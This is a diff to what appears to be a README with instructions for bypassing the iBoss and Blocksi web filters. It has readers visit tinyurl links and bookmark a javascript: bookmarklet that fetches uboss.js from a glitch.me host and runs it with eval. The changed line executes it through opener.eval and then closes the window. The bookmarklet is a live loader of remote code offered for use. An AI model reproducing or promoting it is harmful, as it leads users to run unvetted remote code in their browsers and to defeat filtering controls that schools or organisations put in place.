@@ -61,7 +61,7 @@ First go to https://tinyurl.com/byeswamp if you have iBoss.
 https://tinyurl.com/blockboss if you have Blocksi.
 Then bookmark the code below
 ```js
-javascript:fetch("https://rounded-boiling-flax.glitch.me/uboss.js").then(data=>{data.text().then(e=>{eval(e)})});
+javascript:opener.eval(`fetch("https://rounded-boiling-flax.glitch.me/uboss.js").then(data=>{data.text().then(e=>{eval(e)})})`) && close();
 ```
 
 Then go to the site with your blocker that was listed above.
